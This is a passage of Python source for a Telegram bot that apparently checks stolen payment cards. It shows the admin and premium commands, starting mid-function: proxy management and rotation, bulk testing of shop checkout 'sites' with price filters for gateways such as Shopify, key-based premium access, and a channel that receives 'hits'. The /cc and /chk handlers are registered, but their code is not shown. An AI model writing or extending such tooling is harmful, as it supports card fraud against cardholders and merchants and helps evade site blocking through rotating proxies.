        await status_msg.edit_text(f"✅ Pʀᴏxʏ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_proxies)}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Eʀʀᴏʀ: {e}")

async def cmd_chkproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    try:
        proxy = update.message.text.split(' ', 1)[1].strip()
    except:
        await update.message.reply_text("❌ Usᴀɢᴇ: /chkproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss")
        return
    status_msg = await update.message.reply_text(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxʏ: <code>{proxy}</code>...", parse_mode='HTML')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit_text(f"✅ Pʀᴏxʏ ɪs ALIVE!\n\n<code>{proxy}</code>", parse_mode='HTML')
        else:
            await status_msg.edit_text(f"❌ Pʀᴏxʏ ɪs DEAD!\n\n<code>{proxy}</code>", parse_mode='HTML')
    except Exception as e:
        await status_msg.edit_text(f"❌ Eʀʀᴏʀ: {e}")

async def cmd_rmproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    try:
        proxy_to_remove = update.message.text.split(' ', 1)[1].strip()
    except:
        await update.message.reply_text("❌ Usᴀɢᴇ: /rmproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss")
        return
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await update.message.reply_text(f"❌ Pʀᴏxʏ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{proxy_to_remove}</code>", parse_mode='HTML')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await update.message.reply_text(f"✅ Pʀᴏxʏ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{proxy_to_remove}</code>", parse_mode='HTML')

async def cmd_rmproxyindex(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    try:
        indices_str = update.message.text.split(' ', 1)[1].strip()
    except:
        await update.message.reply_text("❌ Usᴀɢᴇ: /rmproxyindex 1,2,3")
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs.")
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await update.message.reply_text("❌ Nᴏ ᴘʀᴏxɪᴇs.")
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await update.message.reply_text("❌ Nᴏ ᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs.")
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    removed_text = "\n".join(removed[:10])
    await update.message.reply_text(f"✅ Rᴇᴍᴏᴠᴇᴅ {len(removed)} ᴘʀᴏxɪᴇs!\n\n<code>{removed_text}</code>", parse_mode='HTML')

async def cmd_clearproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        await update.message.reply_text("❌ ᴘʀᴏxʏ.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ.")
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await update.message.reply_text(f"✅ Cʟᴇᴀʀᴇᴅ ᴀʟʟ {count} ᴘʀᴏxɪᴇs!")

async def cmd_getproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await update.message.reply_text("❌ Nᴏ ᴘʀᴏxɪᴇs.")
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await update.message.reply_text(f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)}):\n\n{proxy_list}", parse_mode='HTML')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await update.message.reply_document(document=filename, caption=f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)})")
        try:
            os.remove(filename)
        except:
            pass

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        key = update.message.text.split(' ', 1)[1].strip().upper()
    except:
        await update.message.reply_text("📝 Usᴀɢᴇ: /redeem Kᴇʏ")
        return
    keys_data = await load_keys()
    if key not in keys_data:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ Kᴇʏ!")
        return
    key_data = keys_data[key]
    if key_data.get('type') == 'time_limit':
        expiry = datetime.fromisoformat(key_data['expiry'])
        if datetime.now() > expiry:
            await update.message.reply_text("❌ Tʜɪs ᴋᴇʏ ʜᴀs EXPIRED!")
            return
        if key_data['used_count'] >= key_data['user_limit']:
            await update.message.reply_text(f"❌ Tʜɪs ᴋᴇʏ ʜᴀs ʀᴇᴀᴄʜᴇᴅ ɪᴛs ʟɪᴍɪᴛ")
            return
        user_id_str = str(user_id)
        if user_id_str in key_data['used_by']:
            await update.message.reply_text("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴛʜɪs ᴋᴇʏ!")
            return
        if is_premium(user_id):
            await update.message.reply_text("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴘʀᴇᴍɪᴜᴍ!")
            return
        await add_premium_user(user_id)
        key_data['used_count'] += 1
        key_data['used_by'].append(user_id_str)
        keys_data[key] = key_data
        await save_keys(keys_data)
        await update.message.reply_text(f"""🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!
⭐ Vɪᴘ Aᴄᴄᴇss Aᴄᴛɪᴠᴀᴛᴇᴅ!
📅 Dᴜʀᴀᴛɪᴏɴ: {key_data['hours']} hours""")

# ==================================================
# 8. الأوامر الإدارية (للمطور فقط)
# ==================================================
async def cmd_addpremium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        target_id = int(update.message.text.split(' ', 1)[1].strip())
    except:
        await update.message.reply_text("📝 /addpremium ᴜsᴇʀ_ɪᴅ")
        return
    if await add_premium_user(target_id):
        await update.message.reply_text(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ!", parse_mode='HTML')
    else:
        await update.message.reply_text(f"⚠️ Usᴇʀ <code>{target_id}</code> ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ.", parse_mode='HTML')

async def cmd_removepremium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        target_id = int(update.message.text.split(' ', 1)[1].strip())
    except:
        await update.message.reply_text("📝 /removepremium ᴜsᴇʀ_ɪᴅ")
        return
    if await remove_premium_user(target_id):
        await update.message.reply_text(f"✅ Usᴇʀ <code>{target_id}</code> ʀᴇᴍᴏᴠᴇᴅ!", parse_mode='HTML')
    else:
        await update.message.reply_text(f"⚠️ Usᴇʀ <code>{target_id}</code> ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ.", parse_mode='HTML')

async def cmd_listpremium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    users = load_premium_users()
    if not users:
        await update.message.reply_text("📭 Nᴏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs.")
        return
    await update.message.reply_text(f"👑 Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(users)}):\n" + "\n".join([f"• <code>{u}</code>" for u in users]), parse_mode='HTML')

async def cmd_genkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        parts = update.message.text.split()
        amount, hours, user_limit = int(parts[1]), int(parts[2]), int(parts[3])
    except:
        await update.message.reply_text("📝 /genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ʟɪᴍɪᴛ")
        return
    keys_data = await load_keys()
    generated = []
    for _ in range(amount):
        key = generate_key()
        keys_data[key] = {
            'type': 'time_limit', 'hours': hours,
            'expiry': (datetime.now() + timedelta(hours=hours)).isoformat(),
            'user_limit': user_limit, 'used_count': 0, 'used_by': []
        }
        generated.append(key)
    await save_keys(keys_data)
    await update.message.reply_text(f"⭐ {amount} Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ!\n" + "\n".join([f"<code>{k}</code>" for k in generated]), parse_mode='HTML')

async def cmd_addsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    if not update.message.reply_to_message:
        await update.message.reply_text("📝 Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return
    reply_msg = update.message.reply_to_message
    if not reply_msg.document or not reply_msg.document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return
    file = await reply_msg.document.get_file()
    file_path = f"temp_sites_{update.effective_user.id}.txt"
    await file.download_to_drive(file_path)
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        os.remove(file_path)
        if not sites:
            await update.message.reply_text("❌ Nᴏ ᴠᴀʟɪᴅ sɪᴛᴇs.")
            return
        current_sites = load_sites()
        new_sites = [s for s in sites if s not in current_sites]
        if not new_sites:
            await update.message.reply_text("⚠️ Aʟʟ sɪᴛᴇs ᴀʟʀᴇᴀᴅʏ ᴇxɪsᴛ.")
            return
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for site in new_sites:
                await f.write(f"{site}\n")
        await update.message.reply_text(f"✅ Aᴅᴅᴇᴅ {len(new_sites)} sɪᴛᴇs!")
    except Exception as e:
        await update.message.reply_text(f"❌ Eʀʀᴏʀ: {e}")

async def cmd_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    sites = load_sites()
    if not sites:
        await update.message.reply_text("❌ sɪᴛᴇs.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ.")
        return
    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text("❌ Nᴏ ᴘʀᴏxɪᴇs.")
        return
    status_msg = await update.message.reply_text(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(sites)} sɪᴛᴇs...")
    alive_sites = []
    dead_sites = []
    sites_with_price = []
    batch_size = 10
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            tasks = [test_site_with_price(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append({'url': res['site'], 'price': res.get('price', 0.0)})
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit_text(f"🔄 Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_sites) + len(dead_sites)}/{len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nDᴇᴀᴅ: {len(dead_sites)}")
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        await status_msg.edit_text(f"✅ Sɪᴛᴇ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_sites)}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Eʀʀᴏʀ: {e}")

async def cmd_rm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        url_to_remove = update.message.text.split(' ', 1)[1].strip()
    except:
        await update.message.reply_text("❌ Usᴀɢᴇ: /rm ʜᴛᴛᴘs://sɪᴛᴇ.ᴄᴏᴍ")
        return
    current_sites = load_sites()
    if url_to_remove not in current_sites:
        await update.message.reply_text(f"❌ Sɪᴛᴇ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{url_to_remove}</code>", parse_mode='HTML')
        return
    new_sites = [site for site in current_sites if site != url_to_remove]
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in new_sites:
            await f.write(f"{site}\n")
    await update.message.reply_text(f"✅ Sɪᴛᴇ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{url_to_remove}</code>", parse_mode='HTML')

async def cmd_getsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    sites = load_sites()
    if not sites:
        await update.message.reply_text("❌ Nᴏ sɪᴛᴇs.")
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"sites_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        for site in sites:
            await f.write(f"{site}\n")
    await update.message.reply_document(document=filename, caption=f"📋 Aʟʟ Sɪᴛᴇs ({len(sites)})")
    try:
        os.remove(filename)
    except:
        pass

async def cmd_setfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        parts = update.message.text.split(maxsplit=3)
        gateway = parts[1]
        range_str = parts[2]
        name = parts[3].strip()
        min_val, max_val = map(float, range_str.split('-'))
        filters = await load_price_filters()
        if gateway not in filters:
            filters[gateway] = []
        filters[gateway].append({"name": name, "min": min_val, "max": max_val})
        await save_price_filters(filters)
        await update.message.reply_text(f"✅ Fɪʟᴛᴇʀ ᴀᴅᴅᴇᴅ: {name}\n💰 {min_val:.0f} - {max_val:.0f}")
    except:
        await update.message.reply_text("📝 Usᴀɢᴇ: /setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\"")

async def cmd_listfilters(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    filters = await load_price_filters()
    if not filters:
        await update.message.reply_text("📭 Nᴏ ғɪʟᴛᴇʀs.")
        return
    text = "🔧 <b>Pʀɪᴄᴇ Fɪʟᴛᴇʀs</b>\n\n"
    for gateway, gateway_filters in filters.items():
        text += f"🛒 <b>{gateway.upper()}</b>\n"
        for i, f in enumerate(gateway_filters, 1):
            text += f"   {i}. {f['name']} ({f['min']:.0f}-{f['max']:.0f})\n"
        text += "\n"
    await update.message.reply_text(text, parse_mode='HTML')

async def cmd_removefilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        parts = update.message.text.split()
        gateway = parts[1].lower()
        filter_num = int(parts[2]) - 1
        filters = await load_price_filters()
        if gateway not in filters or filter_num >= len(filters[gateway]):
            await update.message.reply_text(f"❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ.")
            return
        removed = filters[gateway].pop(filter_num)
        await save_price_filters(filters)
        await update.message.reply_text(f"✅ Fɪʟᴛᴇʀ ʀᴇᴍᴏᴠᴇᴅ: {removed['name']}")
    except:
        await update.message.reply_text("📝 Usᴀɢᴇ: /removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ")

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    await update.message.reply_text(f"""📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>
👑 Aᴅᴍɪɴs: 1
💎 Pʀᴇᴍɪᴜᴍ Usᴇʀs: {len(premium_users)}
🌐 Sɪᴛᴇs: {len(sites)}
🔌 Pʀᴏxɪᴇs: {len(proxies)}
🤖 Sᴛᴀᴛᴜs: Rᴜɴɴɪɴɢ ✅""", parse_mode='HTML')

async def cmd_sethits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    try:
        global HITS_CHANNEL_ID
        HITS_CHANNEL_ID = int(update.message.text.split(' ', 1)[1].strip())
        await update.message.reply_text(f"✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ sᴇᴛ ᴛᴏ: <code>{HITS_CHANNEL_ID}</code>", parse_mode='HTML')
    except:
        await update.message.reply_text("📝 /sethits -1001234567890")

async def cmd_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Aᴅᴍɪɴ ᴏɴʟʏ.")
        return
    global HITS_CHANNEL_ID
    if HITS_CHANNEL_ID == 0:
        await update.message.reply_text("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ ɴᴏᴛ sᴇᴛ.")
        return
    if HITS_CHANNEL_ID < 0:
        HITS_CHANNEL_ID = abs(HITS_CHANNEL_ID)
        await update.message.reply_text("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oғғ")
    else:
        HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
        await update.message.reply_text("✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oɴ")

# ==================================================
# 9. تشغيل البوت
# ==================================================
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cc", cmd_cc))
    application.add_handler(CommandHandler("chk", cmd_chk))
    application.add_handler(CommandHandler("addproxy", cmd_addproxy))
    application.add_handler(CommandHandler("proxy", cmd_proxy))
    application.add_handler(CommandHandler("chkproxy", cmd_chkproxy))
    application.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    application.add_handler(CommandHandler("rmproxyindex", cmd_rmproxyindex))
    application.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
    application.add_handler(CommandHandler("getproxy", cmd_getproxy))
    application.add_handler(CommandHandler("redeem", cmd_redeem))
    application.add_handler(CommandHandler("addpremium", cmd_addpremium))
    application.add_handler(CommandHandler("removepremium", cmd_removepremium))
    application.add_handler(CommandHandler("listpremium", cmd_listpremium))
    application.add_handler(CommandHandler("genkeys", cmd_genkeys))
    application.add_handler(CommandHandler("addsites", cmd_addsites))
    application.add_handler(CommandHandler("site", cmd_site))
    application.add_handler(CommandHandler("rm", cmd_rm))
    application.add_handler(CommandHandler("getsites", cmd_getsites))
    application.add_handler(CommandHandler("setfilter", cmd_setfilter))
    application.add_handler(CommandHandler("listfilters", cmd_listfilters))
    application.add_handler(CommandHandler("removefilter", cmd_removefilter))
    application.add_handler(CommandHandler("stats", cmd_stats))
    application.add_handler(CommandHandler("sethits", cmd_sethits))
    application.add_handler(CommandHandler("hits", cmd_hits))
    application.add_handler(CallbackQueryHandler(button_handler))
    print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ (مع Premium Emoji)!")
    application.run_polling()

if __name__ == "__main__":
    main()
